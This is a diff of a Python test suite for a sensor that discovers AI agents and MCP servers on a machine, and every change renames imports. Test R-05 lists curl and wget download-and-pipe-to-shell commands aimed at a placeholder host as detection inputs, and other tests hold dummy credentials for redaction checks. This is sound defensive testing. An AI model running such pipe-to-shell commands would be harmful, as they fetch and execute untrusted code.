@@ -54,8 +54,8 @@ def r02():
 @case("R-03")
 def r03():
     """A bridge observation must not unite two different tools."""
-    from adr_sensor.discovery.base_probe import Observation
-    from adr_sensor.discovery.resolver import resolve
+    from adr_discovery.base_probe import Observation
+    from adr_discovery.resolver import resolve
 
     shared = "/usr/local/lib/shared-wrapper"
     observations = [
@@ -82,7 +82,7 @@ def r03():
 @case("R-04")
 def r04():
     """Production collects listening sockets, not an empty list."""
-    from adr_sensor.discovery.runner import _live_sockets, live_env
+    from adr_discovery.runner import _live_sockets, live_env
     w = World()
     return w, [has("live_env wires a socket collector",
                    lambda s: isinstance(live_env().sockets, (list, tuple))),
@@ -93,7 +93,7 @@ def r04():
 @case("R-05")
 def r05():
     """Download-and-execute, in the spellings it actually takes."""
-    from adr_sensor.discovery.probes.mcp import classify_launch
+    from adr_discovery.probes.mcp import classify_launch
     variants = ["CURL https://x | sh",
                 "curl -fsSL https://x | env bash",
                 "wget https://x -O- | /bin/bash",
@@ -114,7 +114,7 @@ def r06():
     """The live process table is scoped to this user, not merely described as such."""
     import getpass
 
-    from adr_sensor.discovery.runner import _live_processes
+    from adr_discovery.runner import _live_processes
     processes = _live_processes()
     try:
         me = getpass.getuser()
@@ -128,7 +128,7 @@ def r06():
 @case("R-07")
 def r07():
     """Credentials with no vendor marking are still credentials."""
-    from adr_sensor.discovery.redact import redact_argv, redact_secretish
+    from adr_discovery.redact import redact_argv, redact_secretish
     jwt = "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhbGljZSJ9.s5Zq2Xk9pQwErTyUiOpAsDfGhJkLzXcVbNm"
     argv = redact_argv(["agent", "--auth-token", jwt, "--session-key=CANARYKEY12345678",
                         "--dangerously-skip-permissions", "--port", "8080"])
@@ -160,7 +160,7 @@ def r08():
 @case("R-09")
 def r09():
     """A walk ceiling that fires is recorded, not silent."""
-    from adr_sensor.discovery import env as env_mod
+    from adr_discovery import env as env_mod
     w = World()
     for index in range(30):
         w.file("/Users/alice/dev/wide/f%d.txt" % index, "x")
@@ -180,7 +180,7 @@ def r09():
 @case("R-10")
 def r10():
     """Subprocess output is bounded as well as timed."""
-    from adr_sensor.discovery.runner import MAX_SUBPROCESS_BYTES, _subprocess_runner
+    from adr_discovery.runner import MAX_SUBPROCESS_BYTES, _subprocess_runner
     code, out = _subprocess_runner(
         ["python3", "-c", "print('x' * 5_000_000)"], 10.0)
     w = World()
@@ -211,7 +211,7 @@ def r11():
 @case("R-12")
 def r12():
     """A provider host is a host, not a substring."""
-    from adr_sensor.discovery.probes.openworld import OpenWorldProbe
+    from adr_discovery.probes.openworld import OpenWorldProbe
     probe = OpenWorldProbe()
     w = World()
     return w, [has("a lookalike host does not match",
@@ -225,7 +225,7 @@ def r12():
 @case("R-13")
 def r13():
     """A nix upgrade is a version change, not a reinstall."""
-    from adr_sensor.discovery.paths import install_root
+    from adr_discovery.paths import install_root
     before = install_root("/nix/store/abc123-claude-code-2.1.234/bin/claude")
     after = install_root("/nix/store/def456-claude-code-2.1.235/bin/claude")
     w = World()
@@ -253,7 +253,7 @@ def r14():
 @case("R-15")
 def r15():
     """Snapshot deltas, which the appendix no longer specifies but the code emits."""
-    from adr_sensor.discovery import diff_snapshots
+    from adr_discovery import diff_snapshots
     w = World().path("/opt/homebrew/bin")
     w.file("/opt/homebrew/bin/claude")
     w.run("--version", "claude 1.2.0")
@@ -276,7 +276,7 @@ def r15():
 @case("R-16")
 def r16():
     """Fleet fan-out is one finding, not one per endpoint."""
-    from adr_sensor.discovery import fleet_drift
+    from adr_discovery import fleet_drift
     appeared = [("host%d" % index,
                  [{"change": "appeared", "asset_id": "abc123", "name": "mcp-new",
                    "risk": {"factors": ["unpinned_supply_chain"]}}])
@@ -305,7 +305,7 @@ def r17():
 
     w._http_get = slow_http
     env = w.env()
-    from adr_sensor.discovery.probes.runtime import RuntimeProbe
+    from adr_discovery.probes.runtime import RuntimeProbe
     started = time.time()
     RuntimeProbe().run(env)
     elapsed = time.time() - started
@@ -351,7 +351,7 @@ def r19():
 @case("R-20")
 def r20():
     """Ordinary agent children are not MCP servers; declared ones still are."""
-    from adr_sensor.discovery.probes.process import looks_like_server
+    from adr_discovery.probes.process import looks_like_server
     ordinary = [["npx", "eslint", "."], ["npx", "vite", "--host"], ["npm", "run", "mcp-docs"],
                 ["python", "my-server-test.py"], ["bash", "-c", "echo server-status"],
                 ["node", "build.js"], ["yarn", "run", "start-server"],
@@ -359,7 +359,7 @@ def r20():
                 # endpoint: a snapshot wrapper whose command line happened to
                 # mention a path containing "mcp" became a high-severity finding.
                 ["/bin/zsh", "-c", "source ~/.claude/shell-snapshots/snap.sh && "
-                 "ruff check adr_sensor/discovery/probes/mcp.py"],
+                 "ruff check adr_discovery/probes/mcp.py"],
                 ["bash", "-lc", "python -m pytest tests/test_mcp.py"]]
     servers = [["npx", "-y", "mcp-server-github"], ["node", "/tmp/mcp-rogue.js"],
                ["npx", "-y", "@modelcontextprotocol/server-git"],
@@ -418,7 +418,7 @@ def r22():
 @case("R-23")
 def r23():
     """Two catalog entries may not claim one fingerprint."""
-    from adr_sensor.discovery.catalog import Catalog
+    from adr_discovery.catalog import Catalog
     entries = [{"id": "one", "name": "One", "kind": "cli_agent", "binaries": ["shared"]},
                {"id": "two", "name": "Two", "kind": "cli_agent", "binaries": ["shared"]}]
     lenient = Catalog(entries)
@@ -440,8 +440,8 @@ def r23():
 @case("R-24")
 def r24():
     """A diff compares one endpoint with itself unless told otherwise."""
-    from adr_sensor.discovery import diff_snapshots
-    from adr_sensor.discovery.schema import DiscoverySnapshot
+    from adr_discovery import diff_snapshots
+    from adr_discovery.schema import DiscoverySnapshot
     a = DiscoverySnapshot(hostname="host-a", username="alice", platform="darwin", timestamp="t1")
     b = DiscoverySnapshot(hostname="host-b", username="bob", platform="darwin", timestamp="t2")
     refused = False
@@ -459,10 +459,10 @@ def r24():
 @case("R-25")
 def r25():
     """An asset id identifies one asset, and a diff refuses input where it does not."""
-    from adr_sensor.discovery import diff_snapshots
-    from adr_sensor.discovery.base_probe import Observation
-    from adr_sensor.discovery.resolver import resolve
-    from adr_sensor.discovery.schema import DiscoveredAsset, DiscoverySnapshot
+    from adr_discovery import diff_snapshots
+    from adr_discovery.base_probe import Observation
+    from adr_discovery.resolver import resolve
+    from adr_discovery.schema import DiscoveredAsset, DiscoverySnapshot
 
     twins = [Observation(probe="p", channel="filesystem", kind="cli_agent", name="twin",
                          path="/a/claude", matched_on="binary:claude", catalog_id="claude-code",
@@ -496,8 +496,8 @@ def r25():
 @case("R-26")
 def r26():
     """A stdio server has no endpoint, and that must not break the delta."""
-    from adr_sensor.discovery.diff import config_fingerprint
-    from adr_sensor.discovery.schema import DiscoveredAsset
+    from adr_discovery.diff import config_fingerprint
+    from adr_discovery.schema import DiscoveredAsset
     asset = DiscoveredAsset(kind="mcp_server", name="x", identity="y", owner="alice")
     asset.network = {"endpoint": None}
     asset.risk = {"factors": [], "command": None, "args": None, "pinned": None}
@@ -611,7 +611,7 @@ def r33():
     """A path swapped between the check and the open is refused, not read."""
     import os
 
-    from adr_sensor.discovery import env as env_mod
+    from adr_discovery import env as env_mod
 
     w = World()
     w.file("/allowed/real.json", '{"mcpServers": {}}')
@@ -657,7 +657,7 @@ def r34():
 @case("R-35")
 def r35():
     """Credential flags in every spelling a tool might use."""
-    from adr_sensor.discovery.redact import redact_argv
+    from adr_discovery.redact import redact_argv
     out = redact_argv(["srv", "--api_key", "ordinary-secret-value",
                        "--token:ordinary-secret-value", "--auth-token", "another-secret-value",
                        "--port", "8080", "--dangerously-skip-permissions"])
@@ -677,7 +677,7 @@ def r35():
 @case("R-36")
 def r36():
     """An option's value is not the image, and not the package."""
-    from adr_sensor.discovery.probes.mcp import classify_launch
+    from adr_discovery.probes.mcp import classify_launch
     unpinned = [("docker", ["run", "-v", "/host:tag", "vendor/server:latest"]),
                 ("docker", ["run", "-p", "127.0.0.1:8080:80", "vendor/server:latest"]),
                 ("npx", ["--registry", "https://user@registry.example", "unversioned-package"]),
@@ -696,7 +696,7 @@ def r36():
 @case("R-37")
 def r37():
     """Windows reports one executable in whatever casing was typed."""
-    from adr_sensor.discovery.probes.mcp import server_identity
+    from adr_discovery.probes.mcp import server_identity
     left = server_identity("stdio", "C:\\Tools\\Node.EXE", ["quiet.js"], "")
     right = server_identity("stdio", "c:/tools/node.exe", ["quiet.js"], "")
     other = server_identity("stdio", "python", ["quiet.js"], "")
@@ -708,7 +708,7 @@ def r37():
 @case("R-38")
 def r38():
     """A bracketed IPv6 authority has colons inside it."""
-    from adr_sensor.discovery.net import domain_matches, host_of
+    from adr_discovery.net import domain_matches, host_of
     w = World()
     return w, [has("loopback IPv6 parses",
                    lambda s: host_of("http://[::1]:8000/v1") == "::1"),
@@ -746,8 +746,8 @@ def r39():
 @case("R-40")
 def r40():
     """Rotating a credential is not an uninstall followed by an install."""
-    from adr_sensor.discovery import diff_snapshots
-    from adr_sensor.discovery.probes.mcp import server_identity
+    from adr_discovery import diff_snapshots
+    from adr_discovery.probes.mcp import server_identity
 
     def world_with(token):
         world = World()
@@ -799,7 +799,7 @@ args = ["mcp-server-git"]
 @case("R-42")
 def r42():
     """A version is not a pin because it contains a digit."""
-    from adr_sensor.discovery.probes.mcp import classify_launch
+    from adr_discovery.probes.mcp import classify_launch
     floating = ["pkg@1.x", "pkg@1.2.*", "pkg@beta", "pkg@npm:other", "pkg@github:user/repo",
                 "pkg@>=1.0.0", "pkg@workspace:*", "pkg@^1.2.3", "pkg@~1.2.3", "pkg@latest"]
     exact = ["pkg@1.2.3", "pkg@1.2.3-rc.1", "@scope/pkg@1.2.3", "pkg@0.0.1+build.5"]
@@ -816,7 +816,7 @@ def r42():
 @case("R-43")
 def r43():
     """An option nobody listed must not smuggle an image past the parser."""
-    from adr_sensor.discovery.probes.mcp import classify_launch
+    from adr_discovery.probes.mcp import classify_launch
     unpinned = [["run", "--annotation", "owner:team", "vendor/server:latest"],
                 ["run", "--runtime", "runc:custom", "vendor/server:latest"],
                 ["run", "--some-future-option", "a:b", "vendor/server:latest"]]
@@ -832,7 +832,7 @@ def r43():
 @case("R-44")
 def r44():
     """Credentials in the argument forms that are easy to forget."""
-    from adr_sensor.discovery.redact import redact_argv
+    from adr_discovery.redact import redact_argv
     out = redact_argv(["srv", "--token", "-ordinary-secret", "/token:shortsecret",
                        "/api-key", "slashvalue", "--port", "8080"])
     w = World()
@@ -849,7 +849,7 @@ def r44():
 @case("R-45")
 def r45():
     """One command normalization for identity, correlation and classification."""
-    from adr_sensor.discovery.probes.mcp import classify_launch
+    from adr_discovery.probes.mcp import classify_launch
     windows = ["NPX.EXE", "C:\\Tools\\npx.exe", "DOCKER.EXE",
                "C:\\Program Files\\Docker\\docker.exe"]
     w = World()
